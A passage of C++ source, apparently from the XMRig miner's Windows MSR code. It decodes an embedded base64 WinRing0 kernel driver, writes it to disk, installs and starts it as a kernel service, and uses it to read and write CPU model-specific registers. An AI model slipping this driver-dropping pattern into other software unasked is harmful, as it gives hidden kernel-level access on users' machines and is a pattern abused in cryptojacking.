RUFEX1BPUlRfVUxPTkcAXABXUklURV9QT1JUX1VDSEFSAABeAFdSSVRFX1BPUlRfVVNIT1JUAF0AV1JJVEVfUE9SVF9VTE9ORwAAFQBIYWxHZXRCdXNEYXRhQnlPZmZzZXQAJQBIYWxTZXRCdXNEYXRhQnlPZmZzZXQASEFMLmRsbADLA1J0bFVud2luZACmAUtlQnVnQ2hlY2tFeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAA"
            "AAAAAAAAAAAAAQAJBAAASAAAAOAUAABcAwAAAAAAAAAAAAAAAAAAAAAAAFwDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAIAAQAFAAAAAgABAAUAAAA/"
            "AAAAAAAAAAQABAACAAAAAAAAAAAAAAAAAAAAvAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAmAIAAAEAMAA0ADEAMQAwADQAYgAwAAAASgAZAAEAQwBvAG0AbQBlAG4AdABzAAAAVABoAGUAIABtAG8AZABpAGYAaQBlAGQAIABCAFMARAAgAGwAaQBjAGUAbgBzAGUAAAAAAD4ADwABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAATwBwAGUAbgBMAGkAYgBTAHkAcwAuAG8AcgBnAAAAAAA6AAkAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAVwBpAG4AUgBpAG4AZwAwAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAyAC4AMAAuADUAAAA6AA0AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAFcAaQBuAFIAaQBuAGcAMAAuAHMAeQBzAAAAAACeAD0AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgACgAQwApACAAMgAwADAANwAtADIAMAAwADgAIABPAHAAZQBuAEwAaQBiAFMAeQBzAC4AbwByAGcALgAgAEEAbABsACAAcgBpAGcAaAB0AHMAIAByAGUAcwBlAHIAdgBlAGQALgAAAAAAQgANAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAFcAaQBuAFIAaQBuAGcAMAAuAHMAeQBzAAAAAAAyAAkAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAFcAaQBuAFIAaQBuAGcAMAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADIALgAwAC4ANQAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBu"
            "";
        const char* data = (Is64BitWindows()) ? data64 : data86;
        int buf_len = move_0399_len(data);
        char* buf = new char[buf_len];
        size_t buf_size = move_0399(buf, data);
        DWORD bytesToWrite = (DWORD)buf_size;
        HANDLE fileHandle = CreateFileW(path.data(), GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(fileHandle, (void*)buf, bytesToWrite, &bytesWritten, NULL);
        CloseHandle(fileHandle);
    }

    d_ptr->service = OpenServiceW(d_ptr->manager, kServiceName, SERVICE_ALL_ACCESS);
    if (d_ptr->service) {
        LOG_WARN("%s " YELLOW("service ") YELLOW_BOLD("WinRing0") YELLOW(" already exists"), tag());

        SERVICE_STATUS status;
        const auto rc = QueryServiceStatus(d_ptr->service, &status);

        if (rc) {
            DWORD dwBytesNeeded = 0;

            QueryServiceConfigA(d_ptr->service, nullptr, 0, &dwBytesNeeded);
            if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                std::vector<BYTE> buffer(dwBytesNeeded);
                auto config = reinterpret_cast<LPQUERY_SERVICE_CONFIGA>(buffer.data());

                if (QueryServiceConfigA(d_ptr->service, config, buffer.size(), &dwBytesNeeded)) {
                    LOG_INFO("%s " YELLOW("service path: ") YELLOW_BOLD("\"%s\""), tag(), config->lpBinaryPathName);
                }
            }
        }

        if (rc && status.dwCurrentState == SERVICE_RUNNING) {
            d_ptr->reuse = true;
        }
        else if (!d_ptr->uninstall()) {
            return;
        }
    }

    if (!d_ptr->reuse) {
        d_ptr->service = CreateServiceW(d_ptr->manager, kServiceName, kServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, path.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!d_ptr->service) {
            LOG_ERR("%s " RED("failed to install WinRing0 driver, error %u"), tag(), GetLastError());

            return;
        }

        if (!StartService(d_ptr->service, 0, nullptr)) {
            err = GetLastError();
            if (err != ERROR_SERVICE_ALREADY_RUNNING) {
                if (err == ERROR_FILE_NOT_FOUND) {
                    LOG_ERR("%s " RED("failed to start WinRing0 driver: ") RED_BOLD("\"WinRing0.sys not found\""), tag());
                }
                else {
                    LOG_ERR("%s " RED("failed to start WinRing0 driver, error %u"), tag(), err);
                }

                d_ptr->uninstall();

                return;
            }
        }
    }

    d_ptr->driver = CreateFileW(L"\\\\.\\" SERVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (d_ptr->driver == INVALID_HANDLE_VALUE) {
        LOG_ERR("%s " RED("failed to connect to WinRing0 driver, error %u"), tag(), GetLastError());;
    }
}


xmrig::Msr::~Msr()
{
    d_ptr->uninstall();

    delete d_ptr;
}


bool xmrig::Msr::isAvailable() const
{
    return d_ptr->driver != INVALID_HANDLE_VALUE;
}


bool xmrig::Msr::write(Callback &&callback)
{
    const auto &units = Cpu::info()->units();
    bool success      = false;

    std::thread thread([&callback, &units, &success]() {
        for (int32_t pu : units) {
            if (!Platform::setThreadAffinity(pu)) {
                continue;
            }

            if (!callback(pu)) {
                return;
            }
        }

        success = true;
    });

    thread.join();

    return success;
}


bool xmrig::Msr::rdmsr(uint32_t reg, int32_t cpu, uint64_t &value) const
{
    assert(cpu < 0);

    DWORD size = 0;

    return DeviceIoControl(d_ptr->driver, IOCTL_READ_MSR, &reg, sizeof(reg), &value, sizeof(value), &size, nullptr) != 0;
}


bool xmrig::Msr::wrmsr(uint32_t reg, uint64_t value, int32_t cpu)
{
    assert(cpu < 0);

    struct {
        uint32_t reg = 0;
        uint32_t value[2]{};
    } input;

    static_assert(sizeof(input) == 12, "Invalid struct size for WinRing0 driver");

    input.reg = reg;
    *(reinterpret_cast<uint64_t*>(input.value)) = value;

    DWORD output;
    DWORD k;

    return DeviceIoControl(d_ptr->driver, IOCTL_WRITE_MSR, &input, sizeof(input), &output, sizeof(output), &k, nullptr) != 0;
}
